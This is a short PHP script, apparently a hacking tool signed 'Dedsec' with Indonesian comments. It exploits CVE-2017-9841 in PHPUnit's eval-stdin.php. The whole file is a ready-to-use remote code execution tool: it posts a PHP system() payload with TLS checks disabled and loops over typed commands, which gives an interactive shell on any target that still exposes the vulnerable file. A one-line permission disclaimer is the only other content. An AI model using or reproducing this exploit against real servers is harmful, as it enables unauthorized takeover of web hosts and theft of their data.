<?php

/**
 * Interactive PHPUnit RCE Exploiter (CVE-2017-9841)
 * Tools By Dedsec
 * 
 * Gunakan hanya di server milik sendiri atau dengan izin eksplisit.
 */

error_reporting(E_ALL);

// Target vulnerable eval-stdin.php
$target = "https://target.com/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"; // Ganti dengan target asli

// Fungsi kirim payload
function send_payload($target, $command) {
    $payload = "<?php system('$command'); ?>";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}

// Banner
echo "==============================\n";
echo " PHPUnit RCE Shell - CVE-2017-9841\n";
echo " Tools By Dedsec\n";
echo "==============================\n";

// Loop interaktif
while (true) {
    echo "\nRCE> ";
    $cmd = trim(fgets(STDIN));

    if (in_array(strtolower($cmd), ['exit', 'quit'])) {
        echo "Keluar...\n";
        break;
    }

    if (empty($cmd)) {
        continue;
    }

    $output = send_payload($target, $cmd);
    echo $output;
}

?>
